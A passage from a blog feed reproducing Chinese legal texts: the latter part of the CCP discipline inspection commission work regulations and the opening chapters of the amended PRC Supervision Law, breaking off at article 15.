（三）未在纪律检查机关担负具体工作的委员，应当支持和帮助本地区、本部门、本单位纪律检查机关开展工作；了解所在地区、部门、单位党组织和党员领导干部遵守党章党规党纪、贯彻落实党中央决策部署等情况，提出意见建议，重要问题及时向中央纪委常委会反映。</p><p>  （四）对中央纪委的工作，以及中央纪委常委、其他中央纪委委员进行监督。</p><p>  （五）承担中央纪委安排的其他任务。</p><p>  <strong>第十条</strong>　党的中央纪律检查委员会通过召开全体会议的方式行使以下职权：</p><p>  （一）制定贯彻落实党的全国代表大会和党中央决议决定的重大部署、重大措施。</p><p>  （二）听取和审议常务委员会工作报告。</p><p>  （三）选举常务委员会和书记、副书记。</p><p>  （四）讨论和决定纪检监察工作的重大问题、重大事项。</p><p>  （五）按照权限审议重要党内法规或者规范性文件。</p><p>  （六）决定或者追认给予中央纪委委员撤销党内职务以上处分。</p><p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p><p>  <strong>第十一条</strong>　党的中央纪律检查委员会全体会议每年至少召开一次，由中央纪律检查委员会常务委员会召集并主持。</p><p>  党的中央纪律检查委员会全体会议应当有三分之二以上委员到会方可召开。委员因故不能参加会议的应当在会前请假，其意见可以用书面形式表达。根据需要，可以安排有关人员列席会议。</p><p>  根据讨论和决定事项的不同，采用举手、无记名投票等方式进行表决，赞成票超过应到会委员半数的为通过。</p><p>  对中央纪律检查委员会委员给予撤销党内职务以上处分，必须由应到会委员三分之二以上的多数决定，报党中央批准。</p><p>  <strong>第十二条</strong>　中央纪律检查委员会常务委员会贯彻落实党中央决策部署，以及中央纪律检查委员会全体会议的决定和部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使中央纪律检查委员会职权，主要包括：</p><p>  （一）讨论向党的全国代表大会的工作报告，向党中央请示报告工作，学习贯彻党中央决策部署。</p><p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p><p>  （三）讨论和决定纪检监察工作的重要问题、重要事项。</p><p>  （四）按照权限审议党内法规或者规范性文件。</p><p>  （五）听取以中央纪委名义立案审查的有关案件情况通报。</p><p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p><p>  （七）决定给予中央纪委委员撤销党内职务以上处分，并报党中央批准，待召开全体会议时予以追认。</p><p>  （八）按照干部管理权限审议干部任免事项。</p><p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p><p>  <strong>第十三条</strong>　中央纪律检查委员会常务委员会会议一般定期召开，遇有重要情况可以随时召开。</p><p>  中央纪律检查委员会常务委员会会议由中央纪委书记召集并主持，会议议题由书记确定。</p><p>  中央纪律检查委员会常务委员会会议应当有半数以上常委会委员到会方可召开。审议干部任免事项必须有三分之二以上常委会委员到会。根据需要，可以安排有关人员列席会议。</p><p>  讨论和决定重要问题，应当进行表决。涉及多个事项的，应当逐项表决。表决可以根据讨论和决定事项的不同，采用口头、举手、无记名投票或者记名投票等方式进行，赞成票超过应到会常委会委员半数的为通过。</p><p>  <strong>第十四条</strong>　中央纪律检查委员会办公会议一般定期召开，遇有重要情况可以随时召开。办公会议由中央纪委书记召集并主持，会议议题由书记确定，驻委的副书记、常委会委员及有关负责同志参加。办公会议研究或者决定以下事项：</p><p>  （一）学习贯彻党中央决策部署。</p><p>  （二）机关日常工作中需要研究、决定或者通报的重要事项。</p><p>  （三）按照权限讨论和决定对违犯党纪的党的组织、党员处理、处分等事项。</p><p>  （四）按照干部管理权限讨论和决定有关干部任免事项。</p><p>  （五）其他需要提交办公会议讨论的重要事项。</p><p>  <strong>第十五条</strong>　中央纪律检查委员会机关根据工作需要，设立必要的内设机构，依照有关规定配置机构职能和权限。</p><p>  <strong>第十六条</strong>　党的地方各级纪律检查委员会由同级党的代表大会选举产生，每届任期和同级党的委员会任期相同。</p><p>  党的地方各级纪律检查委员会全体会议，选举常务委员会和书记、副书记，并由同级党的委员会通过，报上级党的委员会批准。</p><p>  上级党的委员会可以根据工作需要，在下级党的代表大会闭会期间，调动、任免下级纪律检查委员会书记、副书记。</p><p>  <strong>第十七条</strong>　党的地方各级纪律检查委员会通过召开全体会议的方式行使以下职权：</p><p>  （一）制定贯彻落实党中央决策部署以及中央纪委工作部署，同级党的代表大会和党委决议决定、上级纪委工作要求的重大措施。</p><p>  （二）听取和审议常务委员会工作报告。</p><p>  （三）选举常务委员会和书记、副书记。</p><p>  （四）讨论和决定管辖范围内纪检监察工作的重大问题、重大事项。</p><p>  （五）按照权限审议规范性文件。</p><p>  （六）决定或者追认给予本级纪委委员撤销党内职务以上处分。</p><p>  （七）研究决定常务委员会提请决定的事项，或者应当由全体会议决定的其他重要事项。</p><p>  <strong>第十八条</strong>　地方各级纪律检查委员会常务委员会贯彻落实党中央决策部署以及中央纪委工作部署，落实同级党委、上级纪委、本级纪委全体会议的工作部署，向全体会议报告工作，接受监督。在全体会议闭会期间，行使本级纪律检查委员会职权，主要包括：</p><p>  （一）讨论向同级党的代表大会的工作报告，向同级党委和上级纪委请示报告工作。</p><p>  （二）召集全体会议，对拟提交全体会议讨论和决定的事项先行审议、提出意见。</p><p>  （三）讨论和决定管辖范围内纪检监察工作的重要问题、重要事项。</p><p>  （四）按照权限审议规范性文件。</p><p>  （五）听取以本级纪委名义立案审查的有关案件情况通报。</p><p>  （六）按照权限讨论和决定对违犯党纪的党组织、党员处理、处分等事项。</p><p>  （七）决定给予本级纪委委员撤销党内职务以上处分，并报同级党委批准后，按照规定报上一级纪委备案或者批准，待召开本级纪委全体会议时予以追认。</p><p>  （八）按照干部管理权限审议干部任免事项。</p><p>  （九）研究决定应当由常务委员会决定的其他重要事项。</p><p>  <strong>第十九条</strong>　地方各级纪律检查委员会委员的任职条件、履职要求，全体会议和常务委员会会议的召开、表决，以及机关机构设置等事项，参照本条例第九条、第十一条、第十三条、第十五条的规定执行。</p><p>  <strong>第二十条</strong>　党的基层委员会是设立纪律检查委员会，还是设立纪律检查委员，由它的上一级党组织根据有关规定和具体情况决定。</p><p>  党的基层纪律检查委员会由党员大会或者党员代表大会选举产生，每届任期和同级党的委员会任期相同。</p><p>  党的基层纪律检查委员会选出的书记、副书记，经同级党的委员会通过后，报上级党组织批准。</p><p>  基层纪律检查委员会委员的任职条件、履职要求等事项，按照有关规定执行。</p><p>  <strong>第二十一条</strong>　党的基层纪律检查委员会根据需要及时召开全体会议，传达学习党中央决策部署以及中央纪委工作部署，传达学习同级党委和上级纪委的工作部署，提出贯彻落实的具体措施，研究讨论管辖范围内纪律检查工作的重要问题、重要事项，按照权限讨论或者决定对违犯党纪的党组织、党员处理、处分等事项。</p><p>  <strong>第二十二条</strong>　乡镇和企业、机关、高校等单位中的党的基层纪律检查委员会应当按照党章、本条例和其他党内法规的有关规定，结合实际建立健全议事规则、工作制度，注重发挥纪委委员在监督执纪、议事决策方面的作用，根据工作需要可以组织纪委委员参与监督执纪有关事项。</p><p>  党的基层纪律检查委员会可以按照有关规定，设立必要的工作机构，配备专职工作人员。</p><p>  党的基层纪律检查委员会应当指导和督促同级党的委员会所属基层党组织纪律检查委员履行职责、发挥作用。</p><p>  <strong>第二十三条</strong>　因调离本地区、辞去公职、退休等原因不适宜继续担任纪律检查委员会委员职务的，应当辞去或者按照程序免去其纪委委员职务。死亡、丧失国籍、被追究刑事责任、被停止党籍、受到撤销党内职务以上处分的，其纪委委员职务自动终止。辞去、免去或者自动终止地方纪委委员、基层纪委委员职务的，应当报上一级党的委员会备案。</p><h2 id="第四章-主要任务"><a href="#第四章-主要任务" class="headerlink" title="第四章　主要任务"></a>第四章　主要任务</h2><p>  <strong>第二十四条</strong>　党的各级纪律检查委员会坚定维护党章，促进党组织和党员牢固树立党章意识、严格遵守党章规定，发挥党章作为管党治党总章程的作用，以严明的纪律巩固党的团结统一。切实维护各项党内法规，有规必依、执规必严、违规必究，保证党内法规得到有效执行，促进依规治党。</p><p>  <strong>第二十五条</strong>　党的各级纪律检查委员会检查党的理论和路线方针政策的执行情况，坚持服务党和国家工作大局，坚决维护党中央权威和集中统一领导，推动党组织和党员统一意志、统一行动。加强对党中央决策部署落实情况的监督检查，坚持跟进监督、精准监督、全程监督，督促党组织和党员履职尽责、担当作为，确保党中央政令畅通、令行禁止。</p><p>  <strong>第二十六条</strong>　党的各级纪律检查委员会协助同级党的委员会推进全面从严治党：</p><p>  （一）协助同级党委制定全面从严治党规划、计划，推动各项工作落实。</p><p>  （二）推动全面从严治党主体责任制度执行，检查同级党委领导班子成员包括“一把手”管党治党责任落实情况，监督下级党组织落实主体责任情况。</p><p>  （三）加强对同级党委领导班子监督，发现班子成员包括“一把手”履职尽责、廉洁自律等方面重要问题，按照规定如实报告。</p><p>  （四）协助同级党委加强对本地区本单位政治生态、党风廉政等情况分析，有关问题向同级党委报告并提出意见建议。</p><p>  （五）协助同级党委开展巡视巡察工作。</p><p>  （六）对日常监督、巡视巡察、审计监督等发现问题整改情况开展检查，通过加强监督推动整改常态化。</p><p>  （七）协助起草相关党内法规和规范性文件。</p><p>  （八）参与党委组织的管党治党有关专项工作。</p><p>  坚持履行协助职责和监督责任有机结合，促进全面从严治党党委主体责任和纪委监督责任贯通协同。</p><p>  <strong>第二十七条</strong>　党的各级纪律检查委员会协助同级党的委员会加强党风建设，锲而不舍落实中央八项规定精神，大力弘扬党的光荣传统和优良作风，驰而不息纠治形式主义、官僚主义、享乐主义和奢靡之风，坚决纠正损害群众利益的不正之风，保持党同人民群众的血肉联系。</p><p>  <strong>第二十八条</strong>　党的各级纪律检查委员会协助同级党的委员会组织协调反腐败工作，坚定不移推进反腐败斗争，坚持和完善党中央集中统一领导、各级党委统筹指挥、纪委监委组织协调、职能部门高效协同、人民群众支持参与的反腐败工作体制机制。</p><p>  发挥党委反腐败协调机构的统筹协调作用，开展反腐败国际追逃追赃等工作，加强相关部门协作配合，增强反腐败整体合力。</p><p>  <strong>第二十九条</strong>　党的纪律检查工作坚持把一体推进不敢腐、不能腐、不想腐作为反腐败斗争的基本方针、新时代全面从严治党的重要方略，惩治震慑、制度约束、提高觉悟一体发力，系统施治、标本兼治，努力取得更多制度性成果和更大治理成效：</p><p>  （一）坚持无禁区、全覆盖、零容忍，坚持重遏制、强高压、长震慑，坚持受贿行贿一起查，巩固不敢腐。</p><p>  （二）坚持将惩治腐败与深化改革、促进治理贯通起来，深入查找制度和体制机制存在的问题，推动补齐制度短板、堵塞监管漏洞、规范权力运行，强化不能腐。</p><p>  （三）坚持教育党员、干部坚定理想信念宗旨，提高党性觉悟，提升道德修养，涵养廉洁文化，筑牢思想上拒腐防变的堤坝，自觉不想腐。</p><p>  <strong>第三十条</strong>　发挥党的纪律检查工作在党和国家监督体系中的重要作用，强化对权力运行的制约和监督，重点加强对领导干部特别是主要领导干部的监督，提升监督全覆盖质量，增强监督的政治性、严肃性、协同性、有效性。</p><p>  深化纪检监察体制改革，推进纪律监督、监察监督、派驻监督、巡视监督统筹衔接，整合运用监督力量，构建系统集成、协同高效的监督机制。坚持以党内监督为主导，促进人大监督、民主监督、行政监督、司法监督、审计监督、财会监督、统计监督、群众监督、舆论监督等各类监督有机贯通、相互协调，健全信息沟通、线索移交、措施配合、成果共享等机制，形成常态长效的监督合力。</p><h2 id="第五章-工作职责"><a href="#第五章-工作职责" class="headerlink" title="第五章　工作职责"></a>第五章　工作职责</h2><p>  <strong>第三十一条</strong>　党的各级纪律检查委员会围绕实现党章赋予的任务，坚持聚焦主责主业，履行监督、执纪、问责职责。</p><p>  坚持把监督作为基本职责，抓早抓小、防微杜渐，综合考虑错误性质、情节后果、主观态度等因素，依规依纪依法、精准有效运用监督执纪“四种形态”：</p><p>  （一）党员、干部有作风纪律方面的苗头性、倾向性问题或者轻微违纪问题，或者有一般违纪问题但具备免予处分情形的，运用监督执纪第一种形态，按照规定进行谈话提醒、批评教育、责令检查等，或者予以诫勉。</p><p>  （二）党员、干部有一般违纪问题，或者违纪问题严重但具有主动交代等从轻减轻处分情形的，运用监督执纪第二种形态，按照规定给予警告、严重警告处分，或者建议单处、并处停职检查、调整职务、责令辞职、免职等处理。</p><p>  （三）党员、干部有严重违纪问题，或者严重违纪并构成严重职务违法的，运用监督执纪第三种形态，按照规定给予撤销党内职务、留党察看、开除党籍处分，同时建议给予降职或者依法给予撤职、开除公职、调整其享受的待遇等处理。</p><p>  （四）党员、干部严重违纪、涉嫌犯罪的，运用监督执纪第四种形态，按照规定给予开除党籍处分，同时依法给予开除公职、调整或者取消其享受的待遇等处理，再移送司法机关依法追究刑事责任。</p><p>  <strong>第三十二条</strong>　党的各级纪律检查委员会应当把自觉遵守纪律的教育作为基础性工作，经常开展党章党规教育，强化党的政治纪律、组织纪律、廉洁纪律、群众纪律、工作纪律、生活纪律教育，深入开展警示教育，以案明纪、以案说法。</p><p>  开展廉政教育，加强全面从严治党、党风廉政建设和反腐败工作的形势任务以及家风家教等宣传教育，推进廉洁文化建设，营造崇廉拒腐氛围。</p><p>　　根据形势需要，着眼保障党的中心工作，作出维护党纪的决定，制定相关法规文件，严明纪律要求，教育、引导和规范党组织、党员行为。</p><p>  <strong>第三十三条</strong>　党的纪律检查委员会应当强化政治监督，重点监督党组织、党员特别是领导干部以下情况：</p><p>  （一）对党忠诚，坚持党的领导，贯彻落实党的理论和路线方针政策、党中央决策部署，践行“两个维护”的情况。</p><p>  （二）坚定理想信念宗旨，牢记初心使命，践行入党誓词，坚持中国特色社会主义制度的情况。</p><p>  （三）落实全面从严治党主体责任和监督责任的情况。</p><p>  （四）贯彻执行民主集中制，公正用权、依法用权、廉洁用权、担当作为的情况。</p><p>  政治监督应当突出“关键少数”，重点加强对“一把手”、同级党委特别是常委会委员的监督。</p><p>  <strong>第三十四条</strong>　党的纪律检查委员会应当加强日常监督，监督方式主要包括：座谈，召集、参加或者列席会议，了解党内同志和社会群众反映；查阅查询相关资料和信息数据；现场调查，驻点监督；督促巡视巡察整改；谈心谈话，听取工作汇报，听取述责述廉；建立健全党员领导干部廉政档案，开展党风廉政意见回复等工作。</p><p>  开展专项监督，针对落实党中央决策部署中的突出问题，行业性、系统性、区域性的管党治党重点问题，形式主义、官僚主义、享乐主义和奢靡之风问题，群众反映强烈、损害群众利益的突出问题加强监督检查。必要时，可以组织、参加或者督促开展集中整治、专项治理。</p><p>  加强基层监督，促进基层监督资源和力量整合，发挥纪检监察、巡察等作用，有效衔接村（居）务监督，建立监督信息网络平台，扩大群众参与，及时发现、处理群众身边的腐败问题和不正之风。</p><p>  <strong>第三十五条</strong>　党的各级纪律检查委员会应当畅通信访举报渠道，依规依纪受理党员群众的信访举报，健全分办、交办、督办、反馈等工作机制。</p><p>  对信访举报情况应当定期分析研判，对反映的典型性、普遍性、苗头性问题提出有针对性的工作建议，形成综合分析或者专题分析材料，向同级党委、上级纪委报告或者向有关党组织通报。</p><p>  对于信访举报反映、监督执纪中发现以及巡视巡察机构和其他单位移交的问题线索，应当实行集中管理，采取谈话函询、初步核实、暂存待查、予以了结等方式分类处置，做到件件有着落。</p><p>  <strong>第三十六条</strong>　党的各级纪律检查委员会对反映党组织、党员的问题线索经过初步核实，对于涉嫌违纪、需要追究党纪责任的，应当按照规定予以立案审查。</p><p>  各级纪律检查委员会按照管理权限，审查违反党章和其他党内法规的比较重要或者复杂的案件，主要包括：同级党委委员、候补委员，同级纪委委员，同级党委管理的党员干部，以及同级党委工作部门，同级党委批准设立的党组（党委），下一级党委、纪委等涉嫌违纪案件；案情重大复杂，需要采取重要审查措施的案件；同级党委、上级纪委交办的其他案件。</p><p>  地方各级纪律检查委员会和基层纪律检查委员会对于处理涉及同级党委委员、候补委员，同级党委管理的正职领导干部，同级纪委常委、监委委员等人员的案件，以及涉及政治问题、国家安全等特别重要或者复杂案件中的问题和处理的结果，在向同级党委报告的同时，即向上级纪委一并报告。</p><p>  纪律审查工作应当依规依纪采取谈话、查询、调取、暂扣、封存、勘验检查、鉴定等措施，以及通过要求相关组织作出说明等方式，收集证据，查明事实，处置违纪所得。</p><p>  <strong>第三十七条</strong>　党的各级纪律检查委员会根据纪律审查结果，依据相关党内法规，对应当追究党纪责任的党组织和党员进行纪律处理、处分。</p><p>  对于各级纪律检查委员会立案审查的党员，需要给予纪律处分的，一般由负责审查的纪委提出处分意见，经被审查人所在党支部的党员大会讨论形成决议，并按照规定报党的基层委员会批准或者有权处分的党组织审批。在特殊情况下，县级和县级以上各级纪委有权直接决定给予党员纪律处分，主要包括：案情涉密、敏感；违纪案件跨地区跨部门跨单位；违纪党员所在的基层党组织无法正常履行职责、不正确履行职责或者其负责人同违纪问题有关联；违纪党员为县级或者县级以上各级党委管理的党员干部；党章和其他党内法规明确规定的相关情况。</p><p>  地方各级纪律检查委员会和基层纪律检查委员会对同级党的委员会处理案件的决定有不同意见的，可以请求上一级纪委予以复查。</p><p>  建立健全处分决定执行公示、回访教育、情况报告和专项检查等制度，加强与相关党组织及职能部门的协作沟通，确保处分决定得到严格执行。</p><p>  <strong>第三十八条</strong>　党的纪律检查委员会发现党组织、党的领导干部在党的建设、党的事业中失职失责的，应当依据相关党内法规开展问责调查，查明失职失责问题，向党的委员会提出责任追究的建议，或者按照规定的权限和程序作出问责决定。</p><p>  <strong>第三十九条</strong>　党的纪律检查委员会对于党员因合法权益受到党组织或者其他党员侵害提出的控告，按照规定予以受理，及时恰当进行处理。通过办理党员的控告发现的违纪违法问题，按照本章规定进行检查和处理。</p><p>  对于党员因不服纪委或者其他党组织给予本人的处理、处分而提出的申诉，按照规定予以受理，进行复议复查。</p><p>  <strong>第四十条</strong>　党的各级纪律检查委员会应当依据相关党内法规，加强对党组织和领导干部履行保障党员权利工作职责的监督检查，依规依纪查处侵犯党员权利的行为。开展监督执纪工作，应当落实保障党员权利的规定和要求。</p><p>  <strong>第四十一条</strong>　在监督检查、纪律审查等过程中，应当注意查找分析监督对象所在党组织党风廉政建设、管理监督等方面存在的突出问题，采取制发纪律检查建议书或者其他适当方式，提出有关强化管党治党、净化政治生态、健全制度、整改纠正等意见建议，督促指导和推动有关地区、部门、单位党组织举一反三、切实整改。</p><p>  对于涉及党的建设、党的事业的普遍性、倾向性问题，应当进行深入调研，形成专题报告，报送同级党委、上级纪委或者通报相关党组织，推动解决问题、规范决策、完善政策、健全制度。</p><h2 id="第六章-派驻、派出机构"><a href="#第六章-派驻、派出机构" class="headerlink" title="第六章　派驻、派出机构"></a>第六章　派驻、派出机构</h2><p>  <strong>第四十二条</strong>　党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会向同级党和国家机关全面派驻纪检监察组，按照规定可以向国有企业、事业单位等其他组织和单位派驻纪检监察组。</p><p>  党的中央和地方各级委员会派出党的机关工作委员会、街道工作委员会等代表机关的，党的中央纪律检查委员会国家监察委员会、地方各级纪律检查委员会监察委员会可以相应派出纪检监察工作委员会。</p><p>  <strong>第四十三条</strong>　派驻机构是派出它的党的纪律检查委员会监察委员会的组成部分，由派出机关直接领导、统一管理。</p><p>  派出机构在派出它的党的纪律检查委员会监察委员会和本级党的工作委员会双重领导下进行工作。派出机构按照规定开展纪律检查工作，领导管辖范围内机关纪委等纪检机构的工作。</p><p>  <strong>第四十四条</strong>　派驻机构根据派出机关授权开展监督执纪问责工作：</p><p>  （一）加强对驻在单位（含综合监督单位）的监督，重点对驻在单位领导班子及其成员、党组（党委）管理的领导班子及其成员等进行监督。</p><p>  （二）监督促进驻在单位领导班子贯彻落实党的理论和路线方针政策、党中央决策部署，履行全面从严治党主体责任。</p><p>  （三）经常、及时地向派出机关报告情况和问题。</p><p>  （四）加强对驻在单位纪检机构的业务指导和监督检查，促进其履行监督责任。</p><p>  （五）认真处理信访举报，对问题线索进行集中管理和处置。</p><p>  （六）依规依纪开展纪律审查，严肃查处违纪问题。</p><p>  （七）按照管理权限作出问责决定或者提出问责建议。</p><p>  （八）协助驻在单位党组（党委）做好巡视巡察工作。</p><p>  （九）完成派出机关交办的其他任务。</p><p>  <strong>第四十五条</strong>　健全派驻监督工作机制，统筹协调派出机关内设监督检查室、派驻纪检监察组、地方纪检监察机关、巡视巡察机构等力量，通过“室组”联动监督、“室组地”联合办案等方式，提高派驻监督质量。</p><p>  县（市、区）纪律检查委员会监察委员会开展派驻监督工作，应当保证派驻机构人员力量，推动监督工作向基层延伸，采取综合派驻、工作协作等方式，提升监督效能。</p><h2 id="第七章-队伍建设和监督"><a href="#第七章-队伍建设和监督" class="headerlink" title="第七章　队伍建设和监督"></a>第七章　队伍建设和监督</h2><p>  <strong>第四十六条</strong>　党的各级纪律检查委员会必须坚持以习近平新时代中国特色社会主义思想武装头脑、指导实践、推动工作，突出抓好党的政治建设，教育引导纪检干部不断提高政治判断力、政治领悟力、政治执行力，带头践行“两个维护”，敢于善于斗争，做到忠诚干净担当。</p><p>  <strong>第四十七条</strong>　贯彻新时代党的组织路线，坚持党管干部，严把干部准入关，加强思想淬炼、政治历练、实践锻炼、专业训练，加强理论研究和学科建设，提高把握政策、监督执纪、做思想政治工作等能力，建设高素质专业化干部队伍。</p><p>  <strong>第四十八条</strong>　加强作风建设和纪律建设，保证纪检干部严守政治纪律和政治规矩，模范遵守党的纪律和国家法律，坚持实事求是，深入开展调查研究，密切联系群众，树立纪律严明、作风深入、工作扎实、谦虚谨慎、秉公执纪的良好形象。</p><p>  <strong>第四十九条</strong>　加强监督执纪规范化建设，健全法规制度，规范工作流程，牢固树立法治意识、程序意识、证据意识，依规依纪依法行使纪律检查权。</p><p>  <strong>第五十条</strong>　党的纪律检查委员会必须接受最严格的约束和监督，在同级党委和上级纪委的领导、监督下强化自我监督，自觉接受党的组织和党员的监督。建立完善监督检查、审查调查、案件监督管理、案件审理相互协调、相互制约的工作机制，发挥内设干部监督机构、机关纪委等作用，加大监管和自我净化力度，坚决防治“灯下黑”。</p><p>  党的纪律检查委员会应当自觉接受民主监督、群众监督、舆论监督等各方面监督。任何单位和个人对纪检机关、纪检干部的违纪违法行为，有权提出检举、控告。</p><p>  <strong>第五十一条</strong>　严格执行纪检干部打听案情、过问案件、说情干预问题报告制度，有关情况应当登记备案。</p><p>  纪检干部发现审查组工作人员未经批准接触被审查人、涉案人员及其特定关系人，或者存在交往情形的，应当及时报告并登记备案。</p><p>  <strong>第五十二条</strong>　办理纪检事项的纪检干部存在可能影响事项公正处理情形的，应当主动申请回避，被审查人、检举控告人以及其他有关人员也有权要求其回避。</p><p>  <strong>第五十三条</strong>　纪检干部应当严格执行保密制度，不准私自留存、隐匿、查阅、摘抄、复制、携带问题线索和涉案资料，严禁泄露审查工作情况。</p><p>  纪检干部离职的，应当严格遵守有关离职后从业限制的规定，三年内不得从事与纪律检查工作相关的职业。</p><p>  <strong>第五十四条</strong>　建立健全安全责任制，严格防范发生审查安全事故。组织开展经常性检查和不定期抽查，发现问题及时督促整改。</p><p>  <strong>第五十五条</strong>　纪检干部有以案谋私、跑风漏气、滥用职权以及其他违规违纪违法行为的，必须严肃查处；构成犯罪的，依法追究刑事责任。</p><p>  纪检机关及其领导干部履行职责过程中失职失责造成严重后果或者恶劣影响的，应当严肃问责。</p><h2 id="第八章-附则"><a href="#第八章-附则" class="headerlink" title="第八章　附则"></a>第八章　附则</h2><p>  <strong>第五十六条</strong>　新疆生产建设兵团党的各级纪律检查委员会，党的地区纪律检查委员会和相当于地区纪委的其他纪律检查委员会，党组（党委）纪检组（纪委），纪律检查委员，参照执行本条例。</p><p>  <strong>第五十七条</strong>　中央军事委员会可以根据本条例，制定相关规定。</p><p>  <strong>第五十八条</strong>　本条例由中央纪律检查委员会负责解释。</p><p>  <strong>第五十九条</strong>　本条例自发布之日起施行。</p>]]></content>
      
      
      <categories>
          
          <category> 法规 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 综合法规 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华人民共和国监察法（2024年12月25日）</title>
      <link href="/2025/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%9B%91%E5%AF%9F%E6%B3%95%EF%BC%882024%E5%B9%B412%E6%9C%8825%E6%97%A5%EF%BC%89/"/>
      <url>/2025/06/01/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%9B%91%E5%AF%9F%E6%B3%95%EF%BC%882024%E5%B9%B412%E6%9C%8825%E6%97%A5%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>（2018年3月20日第十三届全国人民代表大会第一次会议通过 根据2024年12月25日第十四届全国人民代表大会常务委员会第十三次会议《全国人民代表大会常务委员会关于修改&lt;中华人民共和国监察法&gt;的决定》修正）</p><p><strong>目　录</strong></p><p>第一章　总　则</p><p>第二章　监察机关及其职责</p><p>第三章　监察范围和管辖</p><p>第四章　监察权限</p><p>第五章　监察程序</p><p>第六章　反腐败国际合作</p><p>第七章　对监察机关和监察人员的监督</p><p>第八章　法律责任</p><p>第九章　附　则</p><h2 id="第一章-总则"><a href="#第一章-总则" class="headerlink" title="第一章　总则"></a>第一章　总则</h2><p>  <strong>第一条</strong>　为了深入开展廉政建设和反腐败工作，加强对所有行使公权力的公职人员的监督，实现国家监察全面覆盖，持续深化国家监察体制改革，推进国家治理体系和治理能力现代化，根据宪法，制定本法。</p><p>  <strong>第二条</strong>　坚持中国共产党对国家监察工作的领导，以马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想为指导，构建集中统一、权威高效的中国特色国家监察体制。</p><p>  <strong>第三条</strong>　各级监察委员会是行使国家监察职能的专责机关，依照本法对所有行使公权力的公职人员（以下称公职人员）进行监察，调查职务违法和职务犯罪，开展廉政建设和反腐败工作，维护宪法和法律的尊严。</p><p>  <strong>第四条</strong>　监察委员会依照法律规定独立行使监察权，不受行政机关、社会团体和个人的干涉。</p><p>  监察机关办理职务违法和职务犯罪案件，应当与审判机关、检察机关、执法部门互相配合，互相制约。</p><p>  监察机关在工作中需要协助的，有关机关和单位应当根据监察机关的要求依法予以协助。</p><p>  <strong>第五条</strong>　国家监察工作严格遵照宪法和法律，以事实为根据，以法律为准绳；权责对等，严格监督；遵守法定程序，公正履行职责；尊重和保障人权，在适用法律上一律平等，保障监察对象及相关人员的合法权益；惩戒与教育相结合，宽严相济。</p><p>  <strong>第六条</strong>　国家监察工作坚持标本兼治、综合治理，强化监督问责，严厉惩治腐败；深化改革、健全法治，有效制约和监督权力；加强法治教育和道德教育，弘扬中华优秀传统文化，构建不敢腐、不能腐、不想腐的长效机制。</p><h2 id="第二章-监察机关及其职责"><a href="#第二章-监察机关及其职责" class="headerlink" title="第二章　监察机关及其职责"></a>第二章　监察机关及其职责</h2><p>  <strong>第七条</strong>　中华人民共和国国家监察委员会是最高监察机关。</p><p>  省、自治区、直辖市、自治州、县、自治县、市、市辖区设立监察委员会。</p><p>  <strong>第八条</strong>　国家监察委员会由全国人民代表大会产生，负责全国监察工作。</p><p>  国家监察委员会由主任、副主任若干人、委员若干人组成，主任由全国人民代表大会选举，副主任、委员由国家监察委员会主任提请全国人民代表大会常务委员会任免。</p><p>  国家监察委员会主任每届任期同全国人民代表大会每届任期相同，连续任职不得超过两届。</p><p>  国家监察委员会对全国人民代表大会及其常务委员会负责，并接受其监督。</p><p>  <strong>第九条</strong>　地方各级监察委员会由本级人民代表大会产生，负责本行政区域内的监察工作。</p><p>  地方各级监察委员会由主任、副主任若干人、委员若干人组成，主任由本级人民代表大会选举，副主任、委员由监察委员会主任提请本级人民代表大会常务委员会任免。</p><p>  地方各级监察委员会主任每届任期同本级人民代表大会每届任期相同。</p><p>  地方各级监察委员会对本级人民代表大会及其常务委员会和上一级监察委员会负责，并接受其监督。</p><p>  <strong>第十条</strong>　国家监察委员会领导地方各级监察委员会的工作，上级监察委员会领导下级监察委员会的工作。</p><p>  <strong>第十一条</strong>　监察委员会依照本法和有关法律规定履行监督、调查、处置职责：</p><p>  （一）对公职人员开展廉政教育，对其依法履职、秉公用权、廉洁从政从业以及道德操守情况进行监督检查；</p><p>  （二）对涉嫌贪污贿赂、滥用职权、玩忽职守、权力寻租、利益输送、徇私舞弊以及浪费国家资财等职务违法和职务犯罪进行调查；</p><p>  （三）对违法的公职人员依法作出政务处分决定；对履行职责不力、失职失责的领导人员进行问责；对涉嫌职务犯罪的，将调查结果移送人民检察院依法审查、提起公诉；向监察对象所在单位提出监察建议。</p><p>  <strong>第十二条</strong>　各级监察委员会可以向本级中国共产党机关、国家机关、中国人民政治协商会议委员会机关、法律法规授权或者委托管理公共事务的组织和单位以及辖区内特定区域、国有企业、事业单位等派驻或者派出监察机构、监察专员。</p><p>  经国家监察委员会批准，国家监察委员会派驻本级实行垂直管理或者双重领导并以上级单位领导为主的单位、国有企业的监察机构、监察专员，可以向驻在单位的下一级单位再派出。</p><p>  经国家监察委员会批准，国家监察委员会派驻监察机构、监察专员，可以向驻在单位管理领导班子的普通高等学校再派出；国家监察委员会派驻国务院国有资产监督管理机构的监察机构，可以向驻在单位管理领导班子的国有企业再派出。</p><p>监察机构、监察专员对派驻或者派出它的监察委员会或者监察机构、监察专员负责。</p><p>  <strong>第十三条</strong>　派驻或者派出的监察机构、监察专员根据授权，按照管理权限依法对公职人员进行监督，提出监察建议，依法对公职人员进行调查、处置。</p><p>  <strong>第十四条</strong>　国家实行监察官制度，依法确定监察官的等级设置、任免、考评和晋升等制度。</p><h2 id="第三章-监察范围和管辖"><a href="#第三章-监察范围和管辖" class="headerlink" title="第三章　监察范围和管辖"></a>第三章　监察范围和管辖</h2><p>  <strong>第十五条</strong>　监察机关对下列公职人员和有关人员进行监察：</p><p>  